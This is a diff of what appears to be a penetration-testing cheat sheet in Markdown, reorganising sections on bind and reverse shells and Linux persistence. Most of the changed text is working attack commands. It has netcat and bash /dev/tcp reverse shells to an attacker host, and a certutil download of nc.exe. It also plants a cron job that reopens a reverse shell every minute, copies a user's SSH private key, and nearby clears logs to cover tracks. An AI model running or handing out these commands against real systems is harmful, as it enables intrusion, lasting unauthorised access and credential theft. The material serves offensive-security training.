@@ -480,6 +480,7 @@ set CMD <command>
   - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
 - [ARP Poisoning](#ARP-Poisoning)
 - [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
+- [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
 - [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
   - [msfvenom](#msfvenom)
 - [Linux Compilation](#Linux-Compilation)
@@ -675,6 +676,57 @@ ALL
 1
 ```
 
+## Bind and Reverse Shells
+[<< Index](#Index)
+```
+nc -help
+
+-n : do not resolve hostnames
+-v : verbosity, can be used multiple times
+-l : listen
+-p : local port number
+-u : UDP instead of TCP
+-e : execute command
+```
+```
+cd /usr/share/windows-resources/binaries/
+python -m SimpleHTTPServer 80
+
+certutil -urlcache -f http://<ip>/nc.exe nc.exe
+nc.exe -h
+```
+- Windows does not have `netcat` by default.
+
+### Transferring Files
+[<< Index](#Index)
+```
+nc -nvlp <port> > received.txt
+nc -nv <ip> <port> < sent.txt
+```
+
+### Bind Shells
+[<< Index](#Index)
+```
+nc -nvlp <port> -e /bin/bash
+nc -nv <ip> <port>
+
+nc -nvlp <port> -e cmd.exe
+nc -nv <ip> <port>
+```
+
+### Reverse Shells
+[<< Index](#Index)
+```
+nc -nvlp <port>
+nc -nv <ip> <port> -e /bin/bash
+
+nc -nvlp <port>
+nc -nv <ip> <port> -e cmd.exe
+```
+```
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
+
 ## MSF Payloads and Listeners
 [<< Index](#Index)
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
@@ -774,7 +826,6 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
   - [Linux History](#Linux-History)
   - [Resource Scripts](#Resource-Scripts)
   - [Windows Event Logs](#Windows-Event-Logs)
-- [Bind and Reverse Shells](#Bind-and-Reverse-Shells)
 - [Keylogging](#Keylogging)
 - [Pivoting](#Pivoting)
 - [Transfer Files](#Transfer-Files)
@@ -922,7 +973,37 @@ meterpreter > getsystem
 - `getsystem` works in session_2 but UAC flag was still set - why?
 
 ## Maintaining Persistent Access
+### Windows
 
+
+### Linux
+#### Cron Jobs
+[<< Index](#Index)
+```
+ps -ef | grep cron
+
+cat /etc/cron*
+ls -al /etc/cron*
+
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron
+
+crontab -i cron
+crontab -l
+```
+```
+nc -nvlp <port>
+```
+
+#### SSH Keys
+[<< Index](#Index)
+```
+ssh <username>@<ip>
+cat .ssh/id_rsa
+
+scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
+chmod 400 id_rsa
+ssh -i id_rsa <username>@<ip>
+```
 
 ## Clearing Tracks
 ### Linux History
@@ -942,57 +1023,6 @@ meterpreter > resource <filename>
 [<< Index](#Index)
 ```
 meterpreter > clearev
-```
-
-## Bind and Reverse Shells
-[<< Index](#Index)
-```
-nc -help
-
--n : do not resolve hostnames
--v : verbosity, can be used multiple times
--l : listen
--p : local port number
--u : UDP instead of TCP
--e : execute command
-```
-```
-cd /usr/share/windows-resources/binaries/
-python -m SimpleHTTPServer 80
-
-certutil -urlcache -f http://<ip>/nc.exe nc.exe
-nc.exe -h
-```
-- Windows does not have `netcat` by default.
-
-### Transferring Files
-[<< Index](#Index)
-```
-nc -nvlp <port> > received.txt
-nc -nv <ip> <port> < sent.txt
-```
-
-### Bind Shells
-[<< Index](#Index)
-```
-nc -nvlp <port> -e /bin/bash
-nc -nv <ip> <port>
-
-nc -nvlp <port> -e cmd.exe
-nc -nv <ip> <port>
-```
-
-### Reverse Shells
-[<< Index](#Index)
-```
-nc -nvlp <port>
-nc -nv <ip> <port> -e /bin/bash
-
-nc -nvlp <port>
-nc -nv <ip> <port> -e cmd.exe
-```
-```
-bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
 
 ## Keylogging
@@ -1112,31 +1142,8 @@ chmod +x linenum.sh
 ```
 - https://github.com/rebootuser/LinEnum
 
-## Linux Persistence Via Cron Jobs
-```
-ps -ef | grep cron
 
-cat /etc/cron*
-ls -al /etc/cron*
 
-echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron
-
-crontab -i cron
-crontab -l
-```
-```
-nc -nvlp <port>
-```
-
-## Linux Persistence Via SSH Keys
-```
-ssh <username>@<ip>
-cat .ssh/id_rsa
-
-scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
-chmod 400 id_rsa
-ssh -i id_rsa <username>@<ip>
-```
 
 ## Pivoting
 ```
